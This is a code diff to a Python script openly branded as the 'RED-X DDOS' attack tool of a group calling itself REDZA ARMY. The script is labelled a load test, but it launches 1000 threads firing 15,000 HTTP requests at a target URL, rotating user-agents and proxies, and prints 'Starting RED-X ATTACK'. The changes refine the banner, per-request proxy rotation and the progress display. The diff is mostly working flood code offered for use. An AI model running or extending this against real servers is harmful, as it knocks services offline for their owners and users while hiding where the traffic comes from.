@@ -8,8 +8,7 @@ from tqdm import tqdm
 from colorama import Fore, Style
 
 # ✅ ASCII Banner with Developer Info
-RED_X_ATTACK_BANNER = f"""{Fore.RED}
-
+RED_X_ATTACK_BANNER = r"""
   _____  ______ _____      __   __
  |  __ \|  ____|  __ \     \ \ / /
  | |__) | |__  | |  | |_____\ V / 
@@ -17,20 +16,16 @@ RED_X_ATTACK_BANNER = f"""{Fore.RED}
  | | \ \| |____| |__| |     / . \ 
  |_|  \_\______|_____/     /_/ \_\
                                   
-                                {Style.RESET_ALL}
-
-{Fore.CYAN}🚀 REDZA ARMY | RED-X DDOS v1.0 🚀{Style.RESET_ALL}
-{Fore.YELLOW}👨‍💻 Developer: MD SOFIKUL ISLAM {Style.RESET_ALL}
-{Fore.YELLOW}🌐 GitHub: MR-D4RK-OFFICIAL{Style.RESET_ALL}
-{Fore.YELLOW}📧 Contact: mrd4rk@gmail.com{Style.RESET_ALL}
-{Fore.YELLOW} 🎭 TEAM: CIVILIAN CYBER EXPERTS FORCE  {Style.RESET_ALL}
-{Fore.RED}🔥 "RED-X ATTACK – Unleash the power, push servers to the edge!"
+🚀 REDZA ARMY | RED-X DDOS v1.0 🚀
+👨‍💻 Developer: MD SOFIKUL ISLAM
+🌐 GitHub: MR-D4RK-OFFICIAL
+📧 Contact: mrd4rk@gmail.com
+🎭 TEAM: CIVILIAN CYBER EXPERTS FORCE  
+🔥 "RED-X ATTACK – Unleash the power, push servers to the edge!"
 ⚡ "REDZA ARMY | RED-X DDOS v1.0 🚀, unstoppable performance!"
-
-{Style.RESET_ALL}
 """
 
-print(RED_X_ATTACK_BANNER)
+print(f"{Fore.RED}{RED_X_ATTACK_BANNER}{Style.RESET_ALL}")
 
 # ✅ Random User-Agents List
 USER_AGENTS = [
@@ -39,14 +34,14 @@ USER_AGENTS = [
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
 ]
 
-# ✅ Proxy List (Optional)
+# ✅ Dynamic Proxy List
 PROXIES = [
-    "http://username:password@proxy1.com:8080",
-    "http://username:password@proxy2.com:8080",
-    "http://username:password@proxy3.com:8080"
+    "http://proxy1.com:8080",
+    "http://proxy2.com:8080",
+    "http://proxy3.com:8080"
 ]
 
-# ✅ লোড টেস্ট ফাংশন
+# ✅ Load Test Function
 def load_test(url, num_requests=15000, num_threads=1000, use_proxy=False):
     success, failed = 0, 0
     response_times = []
@@ -68,10 +63,10 @@ def load_test(url, num_requests=15000, num_threads=1000, use_proxy=False):
     def worker():
         nonlocal success, failed
         session = requests.Session()
-        proxy = {"http": random.choice(PROXIES)} if use_proxy else None
 
         for _ in range(num_requests // num_threads):
             try:
+                proxy = {"http": random.choice(PROXIES)} if use_proxy else None
                 start_time = time.time()
                 response = session.request(method, url, headers=headers, proxies=proxy, timeout=3)
                 elapsed_time = time.time() - start_time
@@ -87,7 +82,7 @@ def load_test(url, num_requests=15000, num_threads=1000, use_proxy=False):
     # ✅ Thread Execution
     print(f"{Fore.CYAN}Starting RED-X ATTACK...{Style.RESET_ALL}")
     threads = []
-    for _ in tqdm(range(num_threads), desc="Launching Threads"):
+    for _ in tqdm(range(num_threads), desc="Launching Threads", ascii=True, ncols=80):
         thread = threading.Thread(target=worker, daemon=True)
         thread.start()
         threads.append(thread)
@@ -96,7 +91,7 @@ def load_test(url, num_requests=15000, num_threads=1000, use_proxy=False):
         thread.join()
 
     # ✅ রিপোর্ট
-    avg_response_time = sum(response_times) / len(response_times) if response_times else 0
+    avg_response_time = sum(response_times) / len(response_times) if len(response_times) > 0 else 0
     print(f"\n{Fore.GREEN}RED-X ATTACK Completed!{Style.RESET_ALL}")
     print(f"Total Requests: {num_requests}")
     print(f"Successful Requests: {success}")
